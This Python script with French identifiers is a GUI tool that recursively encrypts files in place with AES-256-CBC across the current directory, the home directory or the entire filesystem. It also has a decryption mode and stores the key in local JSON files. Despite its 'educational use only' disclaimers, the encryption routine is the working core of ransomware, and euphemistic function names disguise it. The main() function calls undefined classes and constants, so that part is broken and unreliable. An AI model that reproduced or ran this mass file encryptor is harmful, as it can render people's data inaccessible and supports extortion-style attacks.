import os
import sys
import json
import time
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox, simpledialog

class GestionnaireSecuriteAvance:
    def __init__(self):
        self.taille_cle = 32  # 256 bits pour AES-256
        self.taille_iv = 16   # 128 bits pour le vecteur d'initialisation
        self.element_secret = None
        self.fichiers_traites = 0
        self.dossiers_parcourus = 0
        self.erreurs = 0
        self.timestamp = int(time.time())
        self.marqueur_aleatoire = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        self.chemin_log = f"securite_{self.marqueur_aleatoire}_{self.timestamp}.json"
        
        # Liste des dossiers à exclure pour éviter d'endommager le système
        self.dossiers_exclus = [
            '/proc', '/sys', '/dev', '/run', '/mnt',
            '/media', '/var/lib/docker', '/tmp', '/var/tmp',
            '/boot', '/usr/bin', '/bin', '/sbin', '/usr/sbin',
            '/var/log', '/etc', '/lib', '/lib64'
        ]
        
    def obtenir_element_aleatoire(self):
        """Génère une clé cryptographique aléatoire"""
        return get_random_bytes(self.taille_cle)
    
    def creer_transformation(self, element_secret, donnees):
        """Chiffre les données avec AES-CBC"""
        element_init = get_random_bytes(self.taille_iv)
        transformateur = AES.new(element_secret, AES.MODE_CBC, element_init)
        donnees_ajustees = pad(donnees, AES.block_size)
        resultat = transformateur.encrypt(donnees_ajustees)
        return element_init + resultat  # Concaténer IV et données chiffrées
    
    def inverser_transformation(self, element_secret, donnees_transformees):
        """Déchiffre les données avec AES-CBC"""
        if len(donnees_transformees) < self.taille_iv:
            raise ValueError("Données trop courtes pour contenir un vecteur d'initialisation")
            
        element_init = donnees_transformees[:self.taille_iv]
        donnees_chiffrees = donnees_transformees[self.taille_iv:]
        
        transformateur = AES.new(element_secret, AES.MODE_CBC, element_init)
        try:
            donnees_originales = unpad(transformateur.decrypt(donnees_chiffrees), AES.block_size)
            return donnees_originales
        except ValueError as e:
            raise ValueError(f"Échec du déchiffrement: {e}")
    
    def traiter_document(self, chemin_acces, element_secret, mode="chiffrer"):
        """Traite un fichier (chiffrement ou déchiffrement)"""
        try:
            # Vérifier si le fichier est accessible en lecture/écriture
            if not os.access(chemin_acces, os.R_OK | os.W_OK):
                return False
                
            with open(chemin_acces, 'rb') as document:
                contenu = document.read()
            
            if mode == "chiffrer":
                contenu_transforme = self.creer_transformation(element_secret, contenu)
            elif mode == "dechiffrer":
                contenu_transforme = self.inverser_transformation(element_secret, contenu)
            else:
                raise ValueError(f"Mode inconnu: {mode}")
            
            # Écriture atomique pour éviter la corruption en cas d'interruption
            chemin_temp = f"{chemin_acces}.{self.marqueur_aleatoire}.temp"
            with open(chemin_temp, 'wb') as document_temp:
                document_temp.write(contenu_transforme)
                document_temp.flush()
                os.fsync(document_temp.fileno())
            
            os.replace(chemin_temp, chemin_acces)
            
            self.fichiers_traites += 1
            if self.fichiers_traites % 50 == 0:
                print(f"Progression: {self.fichiers_traites} fichiers traités, {self.dossiers_parcourus} dossiers parcourus")
            
            return True
        except Exception as erreur:
            self.erreurs += 1
            print(f"Problème avec '{chemin_acces}': {erreur}")
            return False
    
    def doit_exclure(self, chemin):
        """Détermine si un chemin doit être exclu du traitement"""
        # Vérifier si le chemin est dans la liste des dossiers exclus
        for exclu in self.dossiers_exclus:
            if chemin.startswith(exclu):
                return True
        
        # Ne pas toucher aux fichiers système critiques ou cachés
        basename = os.path.basename(chemin)
        if basename.startswith('.'):
            # Autoriser certains fichiers cachés comme .txt, .jpg, etc.
            extension = os.path.splitext(basename)[1].lower()
            if extension not in ['.txt', '.jpg', '.jpeg', '.png', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.mp3', '.mp4']:
                return True
                
        # Exclure fichiers système et exécutables
        if basename.endswith(('.sys', '.dll', '.so', '.exe', '.bin', '.ko')):
            return True
            
        # Exclure notre propre fichier de log
        if basename == self.chemin_log:
            return True
            
        return False
    
    def parcourir_et_traiter(self, dossier_racine, element_secret, mode="chiffrer"):
        """Parcourt récursivement un dossier et traite tous les fichiers éligibles"""
        try:
            for root, dirs, files in os.walk(dossier_racine, topdown=True):
                # Modifier dirs en place pour éviter de parcourir les dossiers exclus
                dirs[:] = [d for d in dirs if not self.doit_exclure(os.path.join(root, d))]
                
                self.dossiers_parcourus += 1
                for fichier in files:
                    chemin_complet = os.path.join(root, fichier)
                    if not self.doit_exclure(chemin_complet) and os.path.isfile(chemin_complet):
                        self.traiter_document(chemin_complet, element_secret, mode)
                        
        except Exception as e:
            print(f"Erreur lors du parcours de {dossier_racine}: {e}")
    
    def sauvegarder_information(self, element_secret, mode="chiffrer"):
        """Sauvegarde les informations nécessaires pour le déchiffrement ultérieur"""
        info = {
            "cle_hex": element_secret.hex(),
            "timestamp": self.timestamp,
            "marqueur": self.marqueur_aleatoire,
            "mode": mode,
            "fichiers_traites": self.fichiers_traites,
            "dossiers_parcourus": self.dossiers_parcourus,
            "erreurs": self.erreurs
        }
        
        try:
            with open(self.chemin_log, 'w') as f:
                json.dump(info, f, indent=4)
            print(f"Informations de sécurité sauvegardées dans {self.chemin_log}")
            
            # Créer une copie de sauvegarde dans le dossier utilisateur
            chemin_home = os.path.expanduser("~")
            chemin_backup = os.path.join(chemin_home, f"securite_backup_{self.marqueur_aleatoire}.json")
            with open(chemin_backup, 'w') as f:
                json.dump(info, f, indent=4)
            print(f"Copie de sauvegarde créée dans {chemin_backup}")
            
            return True
        except Exception as e:
            print(f"CRITIQUE: Impossible de sauvegarder les informations: {e}")
            print(f"SAUVEGARDEZ IMMÉDIATEMENT CETTE CLÉ: {element_secret.hex()}")
            return False


class OperationSecurite:
    def __init__(self):
        self.gestionnaire = GestionnaireSecuriteAvance()
    
    def afficher_avertissement(self):
        """Affiche un avertissement avant de procéder à l'opération"""
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        reponse = messagebox.askokcancel(
            "⚠️ AVERTISSEMENT - OPÉRATION CRITIQUE ⚠️", 
            "ATTENTION: Cette opération va traiter des fichiers sur votre système.\n\n" +
            "Ceci est destiné UNIQUEMENT à des fins éducatives sur une machine virtuelle isolée.\n\n" +
            "Continuer peut rendre vos fichiers inaccessibles sans la clé de déchiffrement.\n\n" +
            "Êtes-vous certain de vouloir continuer?"
        )
        
        return reponse
    
    def mode_chiffrement(self):
        """Exécute le mode de chiffrement"""
        # Génération de la clé
        element_secret = self.gestionnaire.obtenir_element_aleatoire()
        
        # Interface utilisateur
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        # Afficher la clé
        cle_hex = element_secret.hex()
        messagebox.showinfo(
            "🔑 CLÉ DE SÉCURITÉ - IMPORTANT 🔑", 
            f"CONSERVEZ CETTE CLÉ EN LIEU SÛR:\n\n{cle_hex}\n\n" +
            "Sans cette clé, vous ne pourrez pas récupérer vos fichiers.\n" +
            "Elle sera également sauvegardée dans des fichiers JSON."
        )
        
        # Sélection du dossier racine
        options = [
            "Répertoire courant (uniquement)",
            "Répertoire utilisateur (recommandé pour test)",
            "Système entier (très risqué)"
        ]
        
        choix = simpledialog.askinteger(
            "Sélection du périmètre",
            "Sélectionnez le périmètre de l'opération:\n\n" +
            "1: Répertoire courant uniquement\n" +
            "2: Répertoire utilisateur (recommandé pour test)\n" +
            "3: Système entier (très risqué)\n",
            minvalue=1, maxvalue=3
        )
        
        if not choix:
            print("Opération annulée par l'utilisateur.")
            return False
            
        if choix == 1:
            racine = os.getcwd()
        elif choix == 2:
            racine = os.path.expanduser("~")
        else:
            racine = "/"
            
        print(f"Début du chiffrement à partir de: {racine}")
        
        # Exécution du chiffrement
        self.gestionnaire.parcourir_et_traiter(racine, element_secret, "chiffrer")
        
        # Sauvegarde des informations
        self.gestionnaire.sauvegarder_information(element_secret, "chiffrer")
        
        # Rapport final
        messagebox.showinfo(
            "Opération terminée", 
            f"Statistiques:\n" +
            f"- {self.gestionnaire.fichiers_traites} fichiers traités\n" +
            f"- {self.gestionnaire.dossiers_parcourus} dossiers parcourus\n" +
            f"- {self.gestionnaire.erreurs} erreurs rencontrées\n\n" +
            f"La clé a été sauvegardée dans {self.gestionnaire.chemin_log}"
        )
        
        return True
    
    def mode_dechiffrement(self):
        """Exécute le mode de déchiffrement"""
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        # Demander la méthode de chargement de la clé
        choix = messagebox.askquestion(
            "Chargement de la clé",
            "Avez-vous un fichier JSON contenant la clé de déchiffrement?"
        )
        
        element_secret = None
        
        if choix == 'yes':
            # Demander le chemin du fichier JSON
            chemin_fichier = simpledialog.askstring(
                "Chemin du fichier",
                "Entrez le chemin complet du fichier JSON:"
            )
            
            if not chemin_fichier:
                print("Opération annulée par l'utilisateur.")
                return False
                
            try:
                with open(chemin_fichier, 'r') as f:
                    donnees = json.load(f)
                    if 'cle_hex' in donnees:
                        element_secret = bytes.fromhex(donnees['cle_hex'])
                        print(f"Clé chargée depuis {chemin_fichier}")
                    else:
                        messagebox.showerror(
                            "Erreur",
                            "Format de fichier de clé invalide."
                        )
                        return False
            except Exception as e:
                messagebox.showerror(
                    "Erreur",
                    f"Impossible de charger la clé depuis le fichier: {e}"
                )
                return False
        else:
            # Demander la clé directement
            cle_hex = simpledialog.askstring(
                "Clé de déchiffrement",
                "Entrez la clé de déchiffrement (format hexadécimal):"
            )
            
            if not cle_hex:
                print("Opération annulée par l'utilisateur.")
                return False
                
            try:
                element_secret = bytes.fromhex(cle_hex)
                print("Clé chargée avec succès.")
            except Exception as e:
                messagebox.showerror(
                    "Erreur",
                    f"Format de clé invalide: {e}"
                )
                return False
        
        # Sélection du dossier racine
        options = [
            "Répertoire courant (uniquement)",
            "Répertoire utilisateur",
            "Système entier"
        ]
        
        choix = simpledialog.askinteger(
            "Sélection du périmètre",
            "Sélectionnez le périmètre de l'opération:\n\n" +
            "1: Répertoire courant uniquement\n" +
            "2: Répertoire utilisateur\n" +
            "3: Système entier\n",
            minvalue=1, maxvalue=3
        )
        
        if not choix:
            print("Opération annulée par l'utilisateur.")
            return False
            
        if choix == 1:
            racine = os.getcwd()
        elif choix == 2:
            racine = os.path.expanduser("~")
        else:
            racine = "/"
            
        print(f"Début du déchiffrement à partir de: {racine}")
        
        # Confirmation avant de démarrer
        confirmation = messagebox.askokcancel(
            "Confirmation",
            f"Vous êtes sur le point de déchiffrer les fichiers dans:\n{racine}\n\n" +
            "Cette opération est irréversible. Voulez-vous continuer?"
        )
        
        if not confirmation:
            print("Opération annulée par l'utilisateur.")
            return False
        
        # Exécution du déchiffrement
        self.gestionnaire.parcourir_et_traiter(racine, element_secret, "dechiffrer")
        
        # Rapport final
        messagebox.showinfo(
            "Opération terminée", 
            f"Statistiques:\n" +
            f"- {self.gestionnaire.fichiers_traites} fichiers traités\n" +
            f"- {self.gestionnaire.dossiers_parcourus} dossiers parcourus\n" +
            f"- {self.gestionnaire.erreurs} erreurs rencontrées"
        )
        
        return True
    

def main():
    operation = OperationSecurite()
    
    # Interface principale avec style rétro/hacker
    fenetre = tk.Tk()
    TerminalUI.configurer_fenetre(fenetre, "SYSTÈME DE SÉCURITÉ AVANCÉ")
    
    # Ajouter un effet de terminal
    canvas = Canvas(fenetre, width=400, height=30, bg="black", highlightthickness=0)
    canvas.pack(pady=(0, 20))
    
    # Effet de scan de ligne
    ligne_y = 0
    ligne = canvas.create_line(0, ligne_y, 400, ligne_y, fill="#00ff00", width=2)
    
    def animer_ligne():
        nonlocal ligne_y
        canvas.coords(ligne, 0, ligne_y, 400, ligne_y)
        ligne_y = (ligne_y + 1) % 30
        fenetre.after(50, animer_ligne)
    
    animer_ligne()
    
    # Ajouter des messages d'initialisation
    messages = [
        "Initialisation du système...",
        "Chargement des modules cryptographiques...",
        "Vérification de l'intégrité du système...",
        "Système prêt."
    ]
    
    label_terminal = Label(fenetre, text="", font=TerminalUI.FONT, bg="black", fg=TerminalUI.TEXT_COLOR)
    label_terminal.pack(pady=5)
    
    def afficher_messages(index=0):
        if index < len(messages):
            label_terminal.config(text=messages[index])
            fenetre.after(500, lambda: afficher_messages(index + 1))
    
    # Commencer l'animation après 500ms
    fenetre.after(500, afficher_messages)
    
    # Ajouter les boutons avec style rétro
    frame_buttons = Frame(fenetre, bg=TerminalUI.BG_COLOR, bd=2, relief=RIDGE)
    frame_buttons.pack(pady=20)
    
    def lancer_chiffrement():
        fenetre.withdraw()
        if operation.afficher_avertissement():
            operation.mode_chiffrement()
        fenetre.destroy()
    
    def lancer_dechiffrement():
        fenetre.withdraw()
        operation.mode_dechiffrement()
        fenetre.destroy()
    
    def quitter():
        if TerminalUI.afficher_message(
            "CONFIRMATION", 
            "Êtes-vous sûr de vouloir quitter le programme?", 
            "warning"
        ):
            fenetre.destroy()
    
    # Effet de bouton qui scintille
    def scintillement(bouton):
        couleur_actuelle = bouton.cget("bg")
        nouvelle_couleur = "#00aa00" if couleur_actuelle == TerminalUI.BUTTON_BG else TerminalUI.BUTTON_BG
        bouton.config(bg=nouvelle_couleur)
        fenetre.after(random.randint(200, 1000), lambda: scintillement(bouton))
    
    btn_chiffrer = TerminalUI.creer_bouton(frame_buttons, "CHIFFRER", lancer_chiffrement)
    btn_chiffrer.pack(pady=10)
    
    btn_dechiffrer = TerminalUI.creer_bouton(frame_buttons, "DÉCHIFFRER", lancer_dechiffrement)
    btn_dechiffrer.pack(pady=10)
    
    btn_quitter = TerminalUI.creer_bouton(frame_buttons, "QUITTER", quitter, largeur=10, hauteur=1)
    btn_quitter.pack(pady=20)
    
    # Effet de scintillement aléatoire pour les boutons
    scintillement(btn_chiffrer)
    fenetre.after(300, lambda: scintillement(btn_dechiffrer))
    
    # Afficher l'état du système
    Label(fenetre, text=f"Version {VERSION}", font=("Courier", 8), bg="black", fg="#888888").pack(side="bottom", pady=5)
    Label(fenetre, text="USAGE ÉDUCATIF UNIQUEMENT", font=("Courier", 8), bg="black", fg="#ff0000").pack(side="bottom")
    
    # Centre la fenêtre
    fenetre.update_idletasks()
    width = fenetre.winfo_width()
    height = fenetre.winfo_height()
    x = (fenetre.winfo_screenwidth() // 2) - (width // 2)
    y = (fenetre.winfo_screenheight() // 2) - (height // 2)
    fenetre.geometry('{}x{}+{}+{}'.format(width, height, x, y))
    
    fenetre.mainloop()

if __name__ == "__main__":
    main()